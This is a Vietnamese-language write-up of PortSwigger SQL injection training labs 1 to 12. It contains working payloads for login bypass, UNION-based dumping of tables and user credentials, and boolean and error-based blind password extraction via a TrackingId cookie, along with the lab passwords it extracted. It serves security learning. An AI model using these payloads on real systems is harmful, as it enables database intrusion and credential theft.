@@ -1,0 +1,263 @@
+# Lab 01
+![image](https://hackmd.io/_uploads/rJNlt5VU-l.png)
+Với bài đầu tiên, khi truy cập vào lab với phân loại sản phẩm bất kì, ta thấy:
+```
+https://0aac00ca04a1b2e5810a2aef009d00dc.web-security-academy.net/filter?category=Lifestyle
+```
+Với gợi ý về việc sử dụng toán tử logic để hiện thị tất cả sản phẩm bằng cách đưa ra truy vấn luôn đúng
+### Khai thác
+- Thêm single quote nhằm đóng truy vấn gốc 
+- Chèn thêm toán tử OR với mệnh đề luôn đúng ở sau (1=1)
+- Thêm dấu comment theo ngôn ngữ SQL
+
+`...?category=Lifestyle'+OR+1=1--+-`
+$\implies$ Khi này, truy vấn ban đầu trở thành:
+```
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- -' AND released = 1
+```
+
+# Lab 02
+![image](https://hackmd.io/_uploads/Sy8pp9ELZg.png)
+Với gợi ý ta chỉ cần điền username: `administrator'-- -`, phần password có thể ghi linh tinh, vì dấu comment đã xóa đi phần kiểm tra pass của query
+Câu truy vấn giờ đây chỉ còn check username có ở DB không và nếu có thì đăng nhập thành công
+$\implies$ Truy vấn gốc trở thành 
+```
+SELECT * FROM users WHERE username = 'administrator'-- -' AND password = 'abc'
+```
+![image](https://hackmd.io/_uploads/rJp_CcNUbx.png)
+
+# Lab 03
+![image](https://hackmd.io/_uploads/BJMHUoNUWl.png)
+Để làm được bài này, ta cần biết được cú pháp để hiện thị được loại DB và phiên bản của Oracle (dùng cheat sheet)
+![image](https://hackmd.io/_uploads/rJ7hIsVIWx.png)
+### Khai thác
+Trước tiên, tiếp cận với lab, ta cần biết số cột của truy vấn gốc là bao nhiêu --> sử dụng `order by`
+```
+https://0a8800ef04b9979080aa087600d20069.web-security-academy.net/filter?category=Accessories%27+order+by+3--+- 
+```
+Ta rà soát từ 1, thấy được khi đến giá trị 3, trình duyệt trả về "Internal Server Error" -->  truy vấn trả về 2 cột
+
+Để xem được database type và vesion của Oracle, ta cần truy vấn đến cột `banner` của bảng `v$version`
+Nhằm khớp số cột để sử dụng UNION, cột còn lại ta có thể ghi giá trị tùy thích, hoặc để `null`
+
+```
+https://0a1600a6038bad668052081500dc007d.web-security-academy.net/filter?category=Food+%26+Drink%27+union+select+banner,banner+from+v$version--+-
+```
+Giả sử truy vấn select ban đầu *(header, content, passage)*, truy vấn gốc trở thành:
+```
+SELECT header, content from passage UNION SELECT banner, banner from v$version-- -
+```
+![image](https://hackmd.io/_uploads/B1Rb0sEL-l.png)
+
+# Lab 04
+![image](https://hackmd.io/_uploads/rJY5k3NIbl.png)
+Thực hiện tuần tự các bước như Lab 03, sử dụng `order by`, truy vấn select gốc trả về 2 cột
+Sử dụng truy vấn cho loại DB như đề bài, ta có:
+```
+https://0abe00ed04411fcb80d6262400bd00ee.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+'abc',@@version--+-
+```
+![image](https://hackmd.io/_uploads/SkoSen4L-l.png)
+### Lưu ý
+$\implies$ Sở dĩ 2 HQTCSDL này có cú pháp truy vấn version khác nhau là vì:
+- MySQL và MicroSoft cho phép truy vấn không nguồn bảng, đồng thời là những truy vấn cố định (constant query). Không bắt buộc có `from`
+- Oracle sử dụng bảng giả `DUAL` chỉ có 1 dòng 1 cột, làm nguồn giả dữ liệu. Bắt buộc cần `from`
+
+# Lab 05
+![image](https://hackmd.io/_uploads/BJctr248Wx.png)
+Ta biết truy vấn gốc trả về 2 cột, dựa vào đề bài, xác định loại HQTCSDL dựa và `version`
+```
+https://0ace000903c24de78bff9a8700e600ea.web-security-academy.net/filter?category=Accessories%27+union+select+version(),'abc'--+-
+```
+![image](https://hackmd.io/_uploads/HJImInVUZe.png)
+Biết được server dùng PostgreSQL, khi ấy so sánh string phải để trong ngoặc ' '
+### Khai thác
+- Tìm các bảng trong CSDL
+```
+https://0ace000903c24de78bff9a8700e600ea.web-security-academy.net/filter?category=Accessories%27+union+select+table_name,%27abc%27+from+information_schema.tables--+-
+```
+![image](https://hackmd.io/_uploads/Byuz5nNLWe.png)
+
+- Tìm các cột có trong bảng `users_obocpg` (đáng nghi nhất)
+```
+https://0ace000903c24de78bff9a8700e600ea.web-security-academy.net/filter?category=Accessories%27+union+select+column_name,%27abc%27+from+information_schema.columns+where+table_name=%27users_obocpg%27--+-
+```
+![image](https://hackmd.io/_uploads/r1M1n3VLZg.png)
+
+- Select 2 cột password và username (như ảnh) trong bảng `users_obocpg`
+```
+https://0ace000903c24de78bff9a8700e600ea.web-security-academy.net/filter?category=Accessories%27+union+select+username_ecfqdx,+password_wqekhj+from+users_obocpg--+-
+```
+![image](https://hackmd.io/_uploads/SJyKh34Ubl.png)
+
+# Lab 06
+![image](https://hackmd.io/_uploads/HkZgtoH8We.png)
+Ta biết trước DBMS được dùng ở đây là Oracle, truy vấn `select` bắt buộc có 'from'
+Tiếp tục với việc tìm số cột được trả ra từ truy vấn gốc --> 2 cột
+![image](https://hackmd.io/_uploads/By3f9oBL-l.png)
+Sử dụng truy vấn cho Oracle(tìm tên bảng trong `all_tables`):
+```
+...'+union+select+null,table_name+from+all_tables--+-
+```
+![image](https://hackmd.io/_uploads/B1s2WnrIZg.png)
+Đề không cho sẵn tên cột của bảng nên ta phải tự đi tìm, có thể tên cột sẽ chèn một số kí tự
+Tiếp tục tìm các cột trong bảng `USERS_QGTZVZ` từ `all_tab_columns`
+```
+...'+union+select+null,column_name+from+all_tab_columns+where+table_name='USERS_QGTZVZ'--+-
+```
+![image](https://hackmd.io/_uploads/B1-TGhrLbe.png)
+Đúng như dự đoán, các cột có sự thay đổi so với mặc định, từ đây đã có thể lấy mật khẩu admin:
+```
+...'+union+select+USERNAME_ESRJGR,PASSWORD_NQPQET+from+USERS_QGTZVZ--+-
+```
+![image](https://hackmd.io/_uploads/rkez43S8Wx.png)
+
+
+
+
+
+# Lab 07
+![image](https://hackmd.io/_uploads/By5yGaELbe.png)
+Tiếp tục sử dụng `order by`, ta xác định được, câu lệnh gốc trả ra 3 cột
+```
+https://0a1a006a03d58b27841a6f26005400f1.web-security-academy.net/filter?category=Accessories%27+order+by+3--+-
+```
+Theo đề bài, ta sử dụng `union select` để tạo dòng mới chứa giá trị `null`
+```
+https://0a1a006a03d58b27841a6f26005400f1.web-security-academy.net/filter?category=Accessories%27+union+select+null,null,null--+-
+```
+
+# Lab 08
+![image](https://hackmd.io/_uploads/HkkAYlBIbx.png)
+Tương tự những lab ở trên, sử dụng `order by` nhằm xác định số cột mà truy vấn trả về (2 cột)
+Tiếp tục với truy vấn trả về bảng:
+```
+https://0a92003c0322b592807ec63000ba00ba.web-security-academy.net/filter?category=Lifestyle%27+union+select+table_name,%27abc%27+from+information_schema.tables--+-
+```
+![image](https://hackmd.io/_uploads/S1AOslr8Wg.png)
+
+Đã được gợi ý, ta khai thác triệt để dữ liệu từ các bảng `users`, ta tìm được 3 cột
+![image](https://hackmd.io/_uploads/HJrYPbr8Zl.png)
+![image](https://hackmd.io/_uploads/By15vWHL-e.png)
+Phạm vi của lab chỉ sử dụng 2 cột:`password` và `username`
+
+Select trực tiếp 2 cột từ bảng `users`, ta được:
+```
+https://0afc00e0032670bf842adbcb002a0097.web-security-academy.net/filter?category=Lifestyle%27+union+select+username,password+from+users--+
+```
+![image](https://hackmd.io/_uploads/SJY7uZrIbe.png)
+
+# Lab 09
+![image](https://hackmd.io/_uploads/S1axqWHLbl.png)
+Thực hiện tương tự các bài trước, tìm tên các bảng 
+```
+...'+union+select+table_name,'abc'+from+information_schema.tables--+-
+```
+Thế nhưng trình duyệt trả ra lỗi, mình nghĩ data type của column đã bị thay đổi (không còn là string), thử với số nguyên int (có thể sử dụng null) thay thế cho 'abc'. 
+```
+...'+union+select+'123',table_name+from+information_schema.tables--+-
+```
+Cần thay đổi cả vị trí giữa `table_name` và '123' để khớp với kiểu dữ liệu trong truy vấn gốc
+![image](https://hackmd.io/_uploads/B18CDMHU-e.png)
+Việc kiểu dữ liệu đầu tiên ở truy vấn gốc là int, ta không thể khớp trực tiếp `username` với `password`, thực hiện truy vấn `union select` với điều kiện `username='administrator'`:
+```
+...'+union+select+'1',password+from+users+where+username=%27administrator%27--+-
+```
+> ui18cp73kqx4ry9dkpz5
+
+# Lab 10
+![image](https://hackmd.io/_uploads/Sk2G8nH8We.png)
+- Lỗ hổng blind sẽ không cho ta thấy kết quả được in ra màn hình 1 cách tường mình, do đó không thể sử dụng `UNION`
+    
+Với gợi ý của đề bài, server đưa giá trị `TrackingId` vào trong truy vấn, ta có thể phân biệt kết quả của truy vấn đúng hay sai thông qua việc chuỗi 'Welcome back' được trả ra hay không
+
+### Khai thác
+- Sử dụng toán tử AND cho `TrackingId`
+```
+TrackingId=2hqih3O7xnPJCFn1' AND '1'='1
+```
+
+Khi này trình duyệt đã hiện 'Welcome'
+- Ta có thể trực tiếp khai thác mật khẩu thông qua dữ liệu về cột và bảng đã được gợi ý. Trước hết cần xác định mật khẩu cảu admin dài bao nhiêu?
+```
+TrackingId=2hqih3O7xnPJCFn1' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = '20
+```
+![image](https://hackmd.io/_uploads/rkhijhB8bg.png)
+$\implies$ Vậy chuỗi mật khẩu gồm 20 kí tự, ta dùng Intruder để tìm từng kí tự ở từng vị trí
+
+- Ta sử dụng Intruder của Burp, tận dụng hàm `SUBSTRING` với cấu trúc 
+
+> SUBSTRING( string, start_position, length )
+
+```
+TrackingId=2hqih3O7xnPJCFn1' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1) = '$a
+```
+![image](https://hackmd.io/_uploads/r1Mm1pSU-x.png)
+- Tìm được kí tự đầu tiên là 'q' , tiếp tục với payload cũ, tăng `start_position` lên 1 đơn vị
+
+![image](https://hackmd.io/_uploads/H1UJuTBLbg.png)
+
+$\implies$ qvu2n29jxyi876arfos8
+
+# Lab 11
+![image](https://hackmd.io/_uploads/ryPrvbLIWg.png)
+- Trình duyệt không thay đổi khi truy vấn đúng hoặc sai (nhưng vẫn hợp lệ về cú pháp) --> không thể nhận diện kết quả payload thông qua conditional response
+- Ta cần làm câu truy vấn bị sai cú pháp, buộc server phải trả về lỗi
+  
+### Khai thác lỗi điều kiện trong Oracle
+Ở bài này, phần Hint cho ta biết đây là Oracle database. Ví dụ về payload:
+![image](https://hackmd.io/_uploads/HyyQEz8I-e.png)
+Trong đó:
+- `dual`: Nếu không lấy dữ liệu từ bảng nào cụ thể, ta sử dụng bảng ảo này
+- `CASE WHEN ... THEN A ELSE B END FROM`: Nếu ... thì A, ngược lại thì B
+- `TO_CHAR(1/0)`: Cái bẫy dẫn đến "*divide-by-zero error*"
+-  `ELSE NULL`: Nhiều điều kiện sai, trả về null, web chạy bình thường
+
+-- Không thể sử dụng `UNION`, do đó ta dùng toán tử `||` nhằm ghép các chuỗi truy vấn lại với nhau. 
+-- Không thể dùng `OR` hay `AND` do đây là logic boolean, do `SELECT` không so sánh với giá trị nào để trả về T/F
+
+-- Dựa vào cheat sheet, ta thử tạo một payload để nhận biết hướng khai thác này đã chuẩn hay chưa: 
+- 1 = 1
+```
+TrackingId=3luDdXAanKgT584b' || (SELECT CASE WHEN 1=1  THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+```
+--> Trả về status code 500 (cắt chuỗi password sẽ tập trung vào đây)
+-- Khi điều kiện đúng thì lệnh thực hiện chia cho 0, gây lỗi cú pháp
+
+- 1 = 2
+
+```
+TrackingId=3luDdXAanKgT584b' || (SELECT CASE WHEN 1=2  THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+```
+--> Trả về status code 200
+-- Khi điều kiện sai thì câu lệnh trở thành 
+`TrackingId=3luDdXAanKgT584b' ||' '||'`
+
+- Tiếp tục với logic khai thác Blind SQLi, xác định chiều dài của `password`
+```
+TrackingId=3luDdXAanKgT584b' || (SELECT CASE WHEN (LENGTH((SELECT password from users where username='administrator'))='20') THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+```
+$\implies$ Đã trả về code 500, mật khẩu gồm 20 kí tự
+
+- Sử dụng Intruder cùng hàm `SUBSTR` để tìm từng giá trị cho từng vị trí của `password`
+```
+TrackingId=3luDdXAanKgT584b' || (SELECT CASE WHEN (SUBSTR((SELECT password from users where username='administrator'),1,1)='n') THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+```
+
+![image](https://hackmd.io/_uploads/HyM0JdUU-x.png)
+
+>  naqur9sfz4ma7ydxu3y8
+
+# Lab 12
+![image](https://hackmd.io/_uploads/HkK4M4v8Wg.png)
+Khi thêm dấu nháy đơn ' vào sau `TrackingId` ta nhận được lỗi:
+
+```html!
+<h4>
+    Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vykFq2DE5QliibPC''. Expected  char
+</h4>
+<p 
+   class=is-warning>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vykFq2DE5QliibPC''. Expected  char
+</p>
+```
+$\implies$ PostgreSQL
+$\implies$ Lỗi trả ra có thể chứa một vài thông tin liên quan tới dữ liệu ta cần khai thác
